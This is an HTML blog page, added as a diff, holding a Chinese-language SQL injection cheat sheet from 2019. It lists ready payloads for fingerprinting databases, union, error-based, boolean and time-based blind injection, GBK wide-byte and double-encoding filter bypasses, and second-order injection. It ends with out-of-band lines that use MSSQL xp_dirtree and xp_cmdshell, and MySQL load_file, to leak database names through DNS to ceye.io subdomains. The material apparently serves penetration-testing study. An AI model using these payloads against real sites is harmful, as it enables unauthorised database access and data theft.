@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="判断数据库的类型123456and length(user())&amp;gt;0返回正常证明是mysqland (select count(*) from sysobjects) &amp;gt;0返回正常证明是sqlserver数据库and (select count(*) from MSysAccessObjects)&amp;gt;0 返回正常说明是access数据库  一、union联合查询注入12345678">
+<meta property="og:type" content="article">
+<meta property="og:title" content="总结SQL注入">
+<meta property="og:url" content="http://yoursite.com/2019/09/09/总结sql注入/index.html">
+<meta property="og:site_name" content="D-yu">
+<meta property="og:description" content="判断数据库的类型123456and length(user())&amp;gt;0返回正常证明是mysqland (select count(*) from sysobjects) &amp;gt;0返回正常证明是sqlserver数据库and (select count(*) from MSysAccessObjects)&amp;gt;0 返回正常说明是access数据库  一、union联合查询注入12345678">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-09-08T16:12:50.247Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="总结SQL注入">
+<meta name="twitter:description" content="判断数据库的类型123456and length(user())&amp;gt;0返回正常证明是mysqland (select count(*) from sysobjects) &amp;gt;0返回正常证明是sqlserver数据库and (select count(*) from MSysAccessObjects)&amp;gt;0 返回正常说明是access数据库  一、union联合查询注入12345678">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>总结SQL注入</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/09/09/CVE-2019-0708远程桌面代码复现/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/09/04/mssql和access实现limit功能/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/09/09/总结sql注入/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/09/09/总结sql注入/&text=总结SQL注入"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/09/09/总结sql注入/&title=总结SQL注入"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/09/09/总结sql注入/&is_video=false&description=总结SQL注入"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=总结SQL注入&body=Check out this article: http://yoursite.com/2019/09/09/总结sql注入/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/09/09/总结sql注入/&title=总结SQL注入"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/09/09/总结sql注入/&title=总结SQL注入"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/09/09/总结sql注入/&title=总结SQL注入"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/09/09/总结sql注入/&title=总结SQL注入"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/09/09/总结sql注入/&name=总结SQL注入&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#判断数据库的类型"><span class="toc-number">1.</span> <span class="toc-text">判断数据库的类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一、union联合查询注入"><span class="toc-number">2.</span> <span class="toc-text">一、union联合查询注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二、报错注入查询"><span class="toc-number">3.</span> <span class="toc-text">二、报错注入查询</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql-8-0可以用"><span class="toc-number">3.1.</span> <span class="toc-text">mysql 8.0可以用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql-5-0可以用"><span class="toc-number">3.2.</span> <span class="toc-text">mysql 5.0可以用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三、布尔盲注"><span class="toc-number">4.</span> <span class="toc-text">三、布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#四、时间延迟盲注"><span class="toc-number">5.</span> <span class="toc-text">四、时间延迟盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#五、宽字节注入"><span class="toc-number">6.</span> <span class="toc-text">五、宽字节注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#六、二次编码注入"><span class="toc-number">7.</span> <span class="toc-text">六、二次编码注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#七、二次注入"><span class="toc-number">8.</span> <span class="toc-text">七、二次注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#八、mssql域名日志注入"><span class="toc-number">9.</span> <span class="toc-text">八、mssql域名日志注入</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        总结SQL注入
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">D-yu</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-09-08T16:13:02.359Z" itemprop="datePublished">2019-09-09</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="判断数据库的类型"><a href="#判断数据库的类型" class="headerlink" title="判断数据库的类型"></a>判断数据库的类型</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">and length(user())&gt;0</span><br><span class="line">返回正常证明是mysql</span><br><span class="line">and (select count(*) from sysobjects) &gt;0</span><br><span class="line">返回正常证明是sqlserver数据库</span><br><span class="line">and (select count(*) from MSysAccessObjects)&gt;0 </span><br><span class="line">返回正常说明是access数据库</span><br></pre></td></tr></table></figure>
+
+<h2 id="一、union联合查询注入"><a href="#一、union联合查询注入" class="headerlink" title="一、union联合查询注入"></a>一、union联合查询注入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">要用联合查询进行注入则：页面必须有显示位。</span><br><span class="line">union可合并两个或多个select语句的结果集，</span><br><span class="line">前提是两个select必有相同列、且各列的数据类型也相同</span><br><span class="line"></span><br><span class="line">首先找注入点且得到闭合字符，判断数据库类型</span><br><span class="line">拼接命令order by加列数，测出有几列，得到显示位</span><br><span class="line">得到显示位之后，利用union select 联合查询，获取库名，表名，字段名，内容等。</span><br><span class="line">例：</span><br><span class="line">id=1<span class="string">' union select 1,database(),3 #</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="二、报错注入查询"><a href="#二、报错注入查询" class="headerlink" title="二、报错注入查询"></a>二、报错注入查询</h2><p>   使用报错注入查询，页面必须返回数据库的报错信息</p>
+<p>   拼接报错注入语句</p>
+<h3 id="mysql-8-0可以用"><a href="#mysql-8-0可以用" class="headerlink" title="mysql 8.0可以用"></a>mysql 8.0可以用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">extractvalue()</span><br><span class="line"></span><br><span class="line">   select * from <span class="built_in">test</span> <span class="built_in">where</span> id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line"></span><br><span class="line">updatexml()</span><br><span class="line"></span><br><span class="line">   select * from <span class="built_in">test</span> <span class="built_in">where</span> id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br></pre></td></tr></table></figure>
+
+<h3 id="mysql-5-0可以用"><a href="#mysql-5-0可以用" class="headerlink" title="mysql 5.0可以用"></a>mysql 5.0可以用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">floor()</span><br><span class="line"></span><br><span class="line">   select * from <span class="built_in">test</span> <span class="built_in">where</span> id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line">extractvalue()</span><br><span class="line"></span><br><span class="line">   select * from <span class="built_in">test</span> <span class="built_in">where</span> id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line"></span><br><span class="line">updatexml()</span><br><span class="line"></span><br><span class="line">   select * from <span class="built_in">test</span> <span class="built_in">where</span> id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line"></span><br><span class="line">geometrycollection()</span><br><span class="line"></span><br><span class="line">   select * from <span class="built_in">test</span> <span class="built_in">where</span> id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">multipoint()</span><br><span class="line"></span><br><span class="line">   select * from <span class="built_in">test</span> <span class="built_in">where</span> id=1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">polygon()</span><br><span class="line"></span><br><span class="line">   select * from <span class="built_in">test</span> <span class="built_in">where</span> id=1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">multipolygon()</span><br><span class="line"></span><br><span class="line">   select * from <span class="built_in">test</span> <span class="built_in">where</span> id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">linestring()</span><br><span class="line"></span><br><span class="line">   select * from <span class="built_in">test</span> <span class="built_in">where</span> id=1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">multilinestring()</span><br><span class="line"></span><br><span class="line">   select * from <span class="built_in">test</span> <span class="built_in">where</span> id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、布尔盲注"><a href="#三、布尔盲注" class="headerlink" title="三、布尔盲注"></a>三、布尔盲注</h2><p>   找注入点且得到闭合字符，判断数据库类型</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">首先获取数据库字符串的长度</span><br><span class="line">id=14<span class="string">' and length((select database()))&gt;5--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">使用二分法</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">判断有几行</span></span><br><span class="line"><span class="string">id=14'</span> and (select count(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">'security'</span>)&gt;5--+</span><br><span class="line"></span><br><span class="line">ASCII计算判断第一个字符</span><br><span class="line"></span><br><span class="line">取第一个字符</span><br><span class="line">and ascii(mid((select group_concat(schema_name) from information_schema.schemata),1,1)) &gt;50</span><br><span class="line">内容多于一行，后面加<span class="built_in">limit</span> 0,1</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、时间延迟盲注"><a href="#四、时间延迟盲注" class="headerlink" title="四、时间延迟盲注"></a>四、时间延迟盲注</h2><p>   和盲注一样，利用时间延迟来判断结果是否正确 sleep （5）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">select sleep(5);停止五秒</span><br><span class="line"></span><br><span class="line">select benchmark(10000000,md5(1));根据你指定的次数运行某一个函数</span><br><span class="line"></span><br><span class="line">select <span class="keyword">if</span> (1=1, 1, 0); 条件为真的话执行第二个参数，为假的话执行第三个参数</span><br><span class="line">select <span class="keyword">if</span>(length(database())&gt;1,sleep(5),1)</span><br><span class="line"></span><br><span class="line">select <span class="keyword">case</span> 1=1 when 1 <span class="keyword">then</span> 123 <span class="keyword">else</span> 456 end;</span><br><span class="line"></span><br><span class="line">select <span class="keyword">case</span> length(version()) when 14 <span class="keyword">then</span> 123 <span class="keyword">else</span> 456 end;</span><br><span class="line">and 先执行左边 ，左边如果为假，右边不执行</span><br><span class="line">or 先执行右边 ，右边如果为假，左边不执行</span><br><span class="line">知道真假，判断使用and或or!为空就是假</span><br><span class="line">在mysql中，or两边都会执行，数据中所有行全部乘以sleep时间执行。</span><br></pre></td></tr></table></figure>
+
+<h2 id="五、宽字节注入"><a href="#五、宽字节注入" class="headerlink" title="五、宽字节注入"></a>五、宽字节注入</h2><p>   宽字节注入是因为数据库使用了GBK编码，不过现在大都使用unicode国际编码，大多数网站都使用了utf-8的编码<br>   前提条件：网站编码类型GBK编码，后端代码中使用了addslashes进行转义</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">%81和%df 在GBK编码中都是一个特殊字符 “ ？ ” </span><br><span class="line">%5c     经过GBK解码是一个 “ \ ” ，正是我们通过addslashes进行转义过后的反斜杠 </span><br><span class="line"></span><br><span class="line">ASCII码同级别的有utf-8(三个16进制的数组成一个汉字)和gbk(两个16进制的数组成一个汉字)</span><br><span class="line">因此我们可以使用GBK，两个数组进行拼接从而达到可以闭合的效果</span><br><span class="line"></span><br><span class="line">%81%5c  经过GBK解码是一个 “ 乗 ” 字</span><br><span class="line">%df%5c  经过GBK解码是一个 “ 運 ” 字</span><br><span class="line"></span><br><span class="line">这样在对方使用addslashes进行转义过后，我们可以通过添加 “ %81或%df ” ，来构造闭合，最后加上注释。即可进行SQL注入。</span><br><span class="line"></span><br><span class="line">php5.3之前的pdo，还受宽字节的影响。</span><br><span class="line"></span><br><span class="line">防止宽字节注入</span><br><span class="line">mysql_set_charset(<span class="string">'GBK'</span>);</span><br><span class="line">mysql_real_escape_string</span><br></pre></td></tr></table></figure>
+
+<h2 id="六、二次编码注入"><a href="#六、二次编码注入" class="headerlink" title="六、二次编码注入"></a>六、二次编码注入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP中常用过滤函数如addslashes()、mysql_real_escape_string()、mysql_escape_string()或者使用魔术引号GPC开关来防止注入，原理都是给单引号（’）、双引号（”）、反斜杠（\）和NULL等特殊字符前面加上反斜杠来进行转义。</span><br><span class="line"></span><br><span class="line">但是这些函数在遇到urldecode()函数时，就会因为二次解码引发注入。urldecode()函数是对已编码的URL进行解码。引发注入的原因其实很简单，PHP本身在处理提交的数据之前会进行一次解码，例如/test.php?id=1这个URL，我们构造字符串/test.php?id=1%2527，PHP第一次解码，%25解码成了%，于是url变成了/test.php?id=%27；然后urldecode()函数又进行了一次解码，%27解码成了’，于是最终URL变成了/test.php?id=1’，单引号引发了注入。rawurldecode()也会产生同样的问题，因此这两个函数需要慎用。</span><br><span class="line"></span><br><span class="line">所以遇到这种情况，进行双编码就可以构造闭合。如：</span><br><span class="line">%2527</span><br></pre></td></tr></table></figure>
+
+<h2 id="七、二次注入"><a href="#七、二次注入" class="headerlink" title="七、二次注入"></a>七、二次注入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</span><br><span class="line">简单点来说，就是我们的数据在进入数据库时，没有被拼接，等从数据库中提取出来时，被拼接了。</span><br><span class="line">比如，我们注册了一个1<span class="string">' union select 1,user(),database()# 的用户，进入时，没有注入。等我们登录的时候，从数据库中调用了它，执行了这个语句。获取到了数据。</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="八、mssql域名日志注入"><a href="#八、mssql域名日志注入" class="headerlink" title="八、mssql域名日志注入"></a>八、mssql域名日志注入</h2><p>   先登录到自己CEYE，准备获取数据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mssql四种方式</span><br><span class="line">xp_subdirs</span><br><span class="line">xp_dirtree</span><br><span class="line">xp_fileexist</span><br><span class="line">前三种用法一样</span><br><span class="line">xp_cmdshell</span><br></pre></td></tr></table></figure>
+
+<p>   先定义变量<br>   DElCLARE @a varchar(1024)<br>   在给变量赋值<br>   使用exec去请求smb服务，过程中会进行域名解析，<br>   将数据带入到域名中，可以在ceye中看到数据<br>   exec(‘master..xp_dirtree “//域名标签/a”‘)</p>
+<p>   例：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">; <span class="built_in">declare</span> @a varchar(1024);<span class="built_in">set</span> @a=db_name();<span class="built_in">exec</span>(<span class="string">'master..xp_dirtree "//'</span> %2B @a %2B <span class="string">'.o0k708.ceye.io/123"'</span>)</span><br><span class="line"></span><br><span class="line">; <span class="built_in">declare</span> @a varchar(1024);<span class="built_in">set</span> @a=db_name();<span class="built_in">exec</span>(<span class="string">'master..xp_cmdshell "ping '</span> %2B @a %2B <span class="string">'.4brg3u.ceye.io"'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>   mysql也可以</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select load_file(<span class="string">'\\\\mysql.4brg3u.ceye.io\\a'</span>);</span><br><span class="line"> 也可以查看日志</span><br><span class="line"> \是用于转义的，四个\代表两个\</span><br><span class="line"></span><br><span class="line">select load_file(concat(<span class="string">'\\\\'</span>,(select count(schema_name) from information_schema.schemata),<span class="string">'.mysql.4brg3u.ceye.io\\a'</span>));</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#判断数据库的类型"><span class="toc-number">1.</span> <span class="toc-text">判断数据库的类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一、union联合查询注入"><span class="toc-number">2.</span> <span class="toc-text">一、union联合查询注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二、报错注入查询"><span class="toc-number">3.</span> <span class="toc-text">二、报错注入查询</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql-8-0可以用"><span class="toc-number">3.1.</span> <span class="toc-text">mysql 8.0可以用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql-5-0可以用"><span class="toc-number">3.2.</span> <span class="toc-text">mysql 5.0可以用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三、布尔盲注"><span class="toc-number">4.</span> <span class="toc-text">三、布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#四、时间延迟盲注"><span class="toc-number">5.</span> <span class="toc-text">四、时间延迟盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#五、宽字节注入"><span class="toc-number">6.</span> <span class="toc-text">五、宽字节注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#六、二次编码注入"><span class="toc-number">7.</span> <span class="toc-text">六、二次编码注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#七、二次注入"><span class="toc-number">8.</span> <span class="toc-text">七、二次注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#八、mssql域名日志注入"><span class="toc-number">9.</span> <span class="toc-text">八、mssql域名日志注入</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/09/09/总结sql注入/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/09/09/总结sql注入/&text=总结SQL注入"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/09/09/总结sql注入/&title=总结SQL注入"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/09/09/总结sql注入/&is_video=false&description=总结SQL注入"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=总结SQL注入&body=Check out this article: http://yoursite.com/2019/09/09/总结sql注入/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/09/09/总结sql注入/&title=总结SQL注入"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/09/09/总结sql注入/&title=总结SQL注入"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/09/09/总结sql注入/&title=总结SQL注入"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/09/09/总结sql注入/&title=总结SQL注入"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/09/09/总结sql注入/&name=总结SQL注入&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
